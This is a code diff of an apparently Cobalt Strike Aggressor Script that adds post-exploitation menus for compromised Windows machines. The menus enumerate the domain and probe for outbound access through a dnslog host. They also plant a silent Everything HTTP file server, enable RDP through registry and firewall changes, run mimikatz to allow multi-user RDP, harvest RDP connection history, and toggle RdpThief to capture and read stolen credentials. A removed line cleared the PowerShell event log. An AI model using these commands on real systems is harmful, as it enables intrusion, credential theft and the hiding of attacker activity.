@@ -125,7 +125,7 @@ menu "信息收集" {
 			}
 
 		}
-				item "查询域" {
+			item "查询域" {
 			$bid = $1['@'];
 			bshell($bid, "net view /domain");
 		}
@@ -207,14 +207,13 @@ menu "信息收集" {
 		$bid = $1['@'];
 		$dialog = dialog("SharpNetCheck", %(host => "ceye.io",,type => "all",bid => $bid), &SharpNetCheck);
 		dialog_description($dialog,"在内网渗透过程中，对可以出网的机器是十分渴望的。在收集大量弱口令的情况下，一个一个去测试能不能出网太麻烦了。所以就有了这个工具，可配合如wmiexec、psexec等横向工具进行批量检测，该工具可以在dnslog中回显内网ip地址和计算机名，可实现内网中的快速定位可出网机器。项目地址：https://github.com/uknowsec/SharpNetCheck");
-		drow_combobox($dialog, "type", "-dns/-http/all", @("-dns", "-http","all"));
+		drow_combobox($dialog, "type", "-dns/-http/all", @("-dns", "-http","-all"));
 		drow_text($dialog, "host", "host/ip:  ");
 		dbutton_action($dialog, "运行");
 		dialog_show($dialog);
 	}
 	sub SharpNetCheck {
 		$arg = join(' ', @($3['type'],"-host",$3['host']));
-		show_message($args);
 		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpNetCheck.exe"), $arg);
 	}
 
@@ -314,6 +313,7 @@ menu "Everything(建立http服务文件搜索)" {
 			dialog_show($dialog);
 		}
 		sub evething {
+			bcd($bid,$3["UploadPath"]);
 			if (-is64 $bid['id']) {
 				bupload($bid, script_resource("/modules/InfoCollection/x64/Everything.exe"));
 				bupload($bid, script_resource("/modules/InfoCollection/x64/Everything.ini"));
@@ -326,7 +326,7 @@ menu "Everything(建立http服务文件搜索)" {
 		item "运行Everything"{
 			$bid = $1['@'];
 			$Dialog = dialog("运行Evething",%(bid => $bid),&Evething_run);
-			dialog_description($Dialog, "运行无任何弹窗及托盘显示，自动启用http服务。端口：65536，用户：admin，密码：admin@123");
+			dialog_description($Dialog, "运行无任何弹窗及托盘显示，自动启用http服务。端口：13579，用户：admin，密码：admin@123");
 			dbutton_action($Dialog, "运行");
 			dialog_show($Dialog);
 		}
@@ -650,15 +650,19 @@ menu "Everything(建立http服务文件搜索)" {
   }
 	}
 	separator();
-	menu "RDP相关" {
-
+	menu "RDP相关" {#参考三好师傅 https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95
+	
+	item "查询系统是否允许3389远程连接"{
+		$bid = $1['@'];
+		blog($bid,"1表示关闭，0表示开启");
+		bshell($bid,"REG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections");
+	}
 	item "获取RDP端口" {
     local('$bid');
     foreach $bid ($1){
       blog($1, "Check Rdp Open Port");
-      bpowershell_import($bid, script_resource("/modules/InfoCollection/NetScan/RDP/RegRdpPort.ps1"));
-      bpowerpick($bid,"RegRdpPort");
-      bshell($bid,"wevtutil cl \"Windows PowerShell\"");
+	  bshell($bid,"REG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber");
+	  blog($1,"自行转换16进制, 0xd3d 为 3389");
     }
   }
   item "查看RDP是否开启" {
@@ -667,8 +671,8 @@ menu "Everything(建立http服务文件搜索)" {
 
   item "开启RDP服务" {
     $bid = $1['@'];
-    bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f");
-    bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1");
+	bshell($bid,"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
+	bshell($bid,"REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 0x00000d3d /f");
   }
 
   item "关闭RDP服务" {
@@ -679,8 +683,46 @@ menu "Everything(建立http服务文件搜索)" {
 
   item "防火墙放行RDP规则" {
     $bid = $1['@'];
+	blog($bid,"如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口");
     bshell($bid, "netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow");
 	}
+	item "解决非服务器系统多用户登录问题" {#相同用户还是会被挤下来,用不同用户即可,使用mimikatz实现,参考于 https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95
+	$bid = $1['@'];#另一种实现方式  https://github.com/stascorp/rdpwrap
+	bmimikatz($bid,"privilege::debug");
+	bmimikatz($bid,"ts::multirdp");
+	}#关于 tscon 可以参考 https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8tscon%E5%AE%9E%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2
+	separator();
+	menu "获得RDP连接记录"{#参考 https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95
+		item "获得登录用户记录" {
+			$bid = $1['@'];
+			bpowershell_import($bid,script_resource("./modules/InfoCollection/ListRdpLinkHistory/ListLogged-inUsers.ps1"));
+			bpowershell($bid);
+		}
+		item "获得所有用户连接记录"{
+			$bid = $1['@'];
+			bpowershell_import($bid,script_resource("./modules/InfoCollection/ListRdpLinkHistory/ListAllUsers.ps1"));
+			bpowershell($bid);
+		}
+	}
+	separator();
+	menu "RdpThief" {
+	#参考 https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%87%AD%E6%8D%AE
+		item "RdpThief Enable" {
+		$bid = $1['@'];
+		blog($bid, "RdpThief enabled \n");
+       	add(@beacons,$bid,0);
+		}
+		item "RdpThief Disable" {
+		$bid = $1['@'];
+		blog($bid, "RdpThief Disable \n");
+       	remove(@beacons,$1);
+		}
+		item "提取记录" {
+			$bid = $1['@'];
+			bshell($bid,"type %temp%\\data.bin")
+		}
+	}
+
 	}
 }
 
